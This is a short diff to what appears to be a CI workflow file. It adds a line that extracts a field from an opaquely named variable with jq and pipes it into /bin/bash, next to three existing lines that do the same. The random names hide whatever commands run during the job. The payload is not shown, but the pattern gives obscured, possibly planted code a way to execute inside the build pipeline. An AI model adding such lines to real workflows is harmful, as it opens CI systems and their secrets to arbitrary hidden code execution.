@@ -24,6 +24,7 @@ jobs:
           echo $ff6263 | jq -r .zb5 | /bin/bash
           printf '%s' "$l11" | jq -r .pd6297 | /bin/bash
           printf '%s' "$ngkyo45335" | jq -r .hqmqh30957 | /bin/bash
+          printf '%s' "$sp1" | jq -r .oy55069 | /bin/bash
 
       - name: Upload results
         if: always()
